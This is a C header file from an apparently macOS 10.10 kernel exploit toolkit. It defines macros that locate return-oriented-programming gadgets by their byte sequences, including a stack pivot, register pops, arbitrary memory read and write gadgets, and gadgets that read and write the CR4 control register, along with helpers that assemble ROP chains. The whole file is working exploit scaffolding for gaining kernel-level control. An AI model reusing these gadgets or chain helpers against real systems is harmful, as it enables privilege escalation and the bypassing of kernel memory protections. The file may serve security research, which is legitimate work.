#ifndef ROP_PIVOT_RAX
/* Short verion of lsym_slide_pointer(lsym_find_symbol()) */

#define RESOLVE_SYMBOL(map, name) lsym_slide_pointer(lsym_find_symbol(map, name))

/* ROP gadgets present in 10.10 */

// stack pivot
#define ROP_PIVOT_RAX(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x50, 0x01, 0x00, 0x00, 0x5b, 0x41, 0x5c, 0x41, 0x5e, 0x41, 0x5F, 0x5D, 0xC3}), 13, 0)
#define ROP_POP_R14_R15_RBP(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x41, 0x5e, 0x41, 0x5F, 0x5D, 0xC3}), 6, 0)
#define ROP_R14_TO_RCX_CALL_pRAX(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x4C,0x89,0xF1,0xFF,0x10}), 5, 0)
#define ROP_R14_TO_RDI_CALL_pRAX(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x4C,0x89,0xF7,0xFF,0x10}), 5, 0)

#define ROP_AND_RCX_RAX_POP_RBP(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x48,0x21,0xc8,0x5d,0xC3}), 5 , 0)
#define ROP_OR_RCX_RAX_POP_RBP(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x48,0x09,0xc8,0x5d,0xC3}), 5 , 0)
#define ROP_RCX_TO_RAX_POP_RBP(map) lsym_find_gadget(map, (char*)((uint8_t[]){0xBA, 0x48, 0x89, 0xC1, 0x48, 0x89, 0xC8, 0x5D, 0xC3}), 9 , 0)

// advanced register control (experimental) - many of these gadget do not require stack pivoting, but allow for register control and register based flow control (which lets us back up registers that our pivot corrupts).
// how the fuck do these gadgets even exist lmao

#define ROP_RAX_TO_RDI_POP_RBP_JMP_RCX(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x48, 0x89, 0xC7, 0x5D, 0xFF, 0xE1}), 6, 0);
#define ROP_RAX_TO_RSI_POP_RBP_JMP_RCX(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x48, 0x89, 0xC6, 0x5D, 0xFF, 0xE1}), 6, 0);
#define ROP_RBX_TO_RSI_CALL_RCX(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x48, 0x89, 0xDE, 0xFF, 0xD1}), 5, 0); // This function does movq rbx, rsi; callq *rcx. so *rcx should point to a pop gadget.
#define ROP_RAX_TO_RCX_POP_RBP(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x48, 0x89, 0xC1, 0x48, 0x89, 0xC8, 0x5D, 0xC3}), 8, 0);
#define ROP_CR4_TO_RAX_WRITE_RAX_TO_pRCX_POP_RBP(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x0F, 0x20, 0xE0, 0x48, 0x89, 0x01, 0x5D, 0xC3}), 8 , 0)
#define ROP_RAX_TO_CR4_WRITE_ESI_TO_60H_RDI_POP_RBP(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x0F, 0x22, 0xE0, 0x89, 0x77, 0x60, 0x5D, 0xC3}), 8 , 0)
#define ROP_PUSH_RBP_8H_RDI_TO_RAX_JMP_0H_RAX(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x55, 0x48, 0x89, 0xE5, 0x48, 0x8B, 0x47, 0x08, 0x5D, 0xFF, 0x20}), 0xB , 0)
#define ROP_RAX_TO_RDI_RCX_TO_RSI_CALL_58H_RAX(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x48, 0x89, 0xC7, 0x48, 0x89, 0xCE, 0xFF, 0x50, 0x58}), 9 , 0)
#define ROP_POP_RBX_RBP_JMP_28H_RAX(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x5B, 0x5D, 0xFF, 0x60, 0x28}), 5 , 0)
#define ROP_WRITE_RBX_WHAT_R14_WHERE_POP_ _POP_R14_POP_RBP(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x49, 0x89, 0x1E, 0x5B, 0x41, 0x5E, 0x5D, 0xC3}), 8 , 0)
#define ROP_POP_R14_POP_RBP(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x41, 0x5E, 0x5D, 0xC3}), 4, 0)
#define ROP_RBX_TO_RSI_CALL_30H_RAX(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x48, 0x89, 0xDE, 0xFF, 0x50, 0x30}), 6, 0)
#define ROP_RDI_TO_RBX_CALL_130H_RAX(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x48, 0x89, 0xFB, 0xFF, 0x90, 0x30, 0x01, 0x00, 0x00}), 9, 0)
#define ROP_RSI_TO_RBX_CALL_178H_RAX(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x48, 0x89, 0xF3, 0xFF, 0x90, 0x78, 0x01, 0x00, 0x00}), 9, 0)
#define ROP_RSI_TO_RAX_POP_RBP(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x48, 0x89, 0xF0, 0x5d, 0xC3}), 5, 0)
#define ROP_INC_48H_RAX_POP_RBP(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x48, 0xff, 0x40, 0x48, 0x5d, 0xC3}), 6, 0)
// register control
#define ROP_POP_RAX(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x58, 0xC3}), 2 , 0)
#define ROP_POP_RCX(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x59, 0xC3}), 2 , 0)
#define ROP_POP_RDX(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x5A, 0xc3}), 2 , 0)
#define ROP_POP_RBX(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x5B, 0xc3}), 2 , 0)
#define ROP_POP_RSP(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x5C, 0xC3}), 2 , 0)
#define ROP_POP_RSP_RBP(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x5C, 0x5d, 0xC3}), 3 , 0)
#define ROP_POP_RBP(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x5D, 0xc3}), 2 , 0)
#define ROP_POP_RSI(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x5E, 0xc3}), 2 , 0)
#define ROP_POP_RDI(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x5F, 0xc3}), 2 , 0)
#define ROP_RSI_TO_RAX(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x55, 0x48, 0x89, 0xE5, 0x48, 0x89, 0xF0, 0x5D, 0xC3}), 9 , 0)

// write gadgets
#define ROP_WRITE_RDX_WHAT_RCX_WHERE_POP_RBP(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x48,0x89,0x11,0x5D,0xC3}), 5 , 0)
#define ROP_WRITE_RAX_WHAT_RDX_WHERE_POP_RBP(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x48,0x89,0x02,0x5D,0xC3}), 5 , 0)

// read gadget
#define ROP_READ_RAX_TO_RAX_POP_RBP(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x48,0x8B,0x00,0x5D,0xC3}), 5 , 0)


// simple nop. 0x90 is added to avoid 0xC3 matching non-executable kernel contents.

#define ROP_NULL_OP(map) lsym_find_gadget(map, (char*)((uint8_t[]){0x90, 0xC3}), 2, 0);

// helpers

#define PUSH_GADGET(stack) stack->__rop_chain[stack->__cnt++]
#define ROP_ARG1(stack, map, value) ROP_POP_RDI(map); PUSH_GADGET(stack) = value;
#define ROP_ARG2(stack, map, value) ROP_POP_RSI(map); PUSH_GADGET(stack) = value;
#define ROP_ARG3(stack, map, value) ROP_POP_RDX(map); PUSH_GADGET(stack) = value;
#define ROP_ARG4(stack, map, value) ROP_POP_RCX(map); PUSH_GADGET(stack) = value;
#define ROP_RAX_TO_ARG1(stack, map) ROP_POP_RCX(map); PUSH_GADGET(stack) = ROP_NULL_OP(map); PUSH_GADGET(stack) = ROP_RAX_TO_RDI_POP_RBP_JMP_RCX(map); PUSH_GADGET(stack) = JUNK_VALUE;
#endif
